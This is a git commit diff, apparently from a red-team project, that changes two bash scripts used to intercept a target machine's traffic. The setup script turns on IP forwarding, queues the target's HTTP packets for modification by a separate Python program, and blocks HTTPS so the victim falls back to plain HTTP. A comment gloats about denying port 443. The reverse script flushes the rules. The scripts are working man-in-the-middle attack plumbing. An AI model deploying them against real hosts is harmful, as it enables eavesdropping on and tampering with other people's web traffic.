ebaa835fad1bd8238cc6f5b273ca249c5622fe1e
hubymeme22 <huby.new1112@gmail.com>
2026-06-14 12:26:11 +0800

    configuration setup changes

--- red-team/scripts/os-proxy-reverse.sh
+++ red-team/scripts/os-proxy-reverse.sh
@@ -1,16 +1,9 @@
 #!/bin/bash
 
-if [ -z "$1" ]; then
-    echo "Usage: os-proxy-reverse.sh <TARGET_IP>"
-    exit 1
-fi
+echo "[*] Cleaning up proxy environment and restoring network defaults..."
 
-TARGET_IP="$1"
+sudo iptables -F FORWARD
+sudo iptables -P FORWARD ACCEPT
+sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
 
-# simple script to forward traffic to the client
-sudo sysctl -w net.ipv4.ip_forward=0
-
-# drop 443 packets to strictly proceed on port 80 packets
-sudo iptables -D FORWARD -s "$TARGET_IP" -p tcp --dport 443 -j DROP
-sudo iptables -D FORWARD -d "$TARGET_IP" -p tcp --sport 443 -j DROP
-sudo iptables -D FORWARD -p tcp --sport 80 -d "$TARGET_IP" -j NFQUEUE --queue-num 1
+echo "[+] Firewall restored. IP forwarding disabled. Network is back to normal!"
--- red-team/scripts/os-proxy-setup.sh
+++ red-team/scripts/os-proxy-setup.sh
@@ -7,12 +7,22 @@ fi
 
 TARGET_IP="$1"
 
-# simple script to forward traffic to the client
-sudo sysctl -w net.ipv4.ip_forward=1
+echo "[*] Setting up routing and firewall rules for target: $TARGET_IP"
 
-# drop 443 packets to strictly proceed on port 80 packets
+# ip forwarding
+sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
+
+# clear existing forward rules
+sudo iptables -F FORWARD
+
+sudo iptables -A FORWARD -p tcp --sport 80 -d "$TARGET_IP" -j NFQUEUE --queue-num 1
+sudo iptables -A FORWARD -p tcp --dport 80 -s "$TARGET_IP" -j NFQUEUE --queue-num 1
+
+# avoid congestion: forward packets that are already modified by our python code
+sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+
+# no, no, dont allow 443 packets >:D
 sudo iptables -A FORWARD -s "$TARGET_IP" -p tcp --dport 443 -j DROP
 sudo iptables -A FORWARD -d "$TARGET_IP" -p tcp --sport 443 -j DROP
 
-# intercept TCP traffic coming from Port 80 (HTTP Responses) heading to the target
-sudo iptables -A FORWARD -p tcp --sport 80 -d 192.168.1.50 -j NFQUEUE --queue-num 1
+echo "[+] Firewall rules successfully applied. You can now launch your Python script."
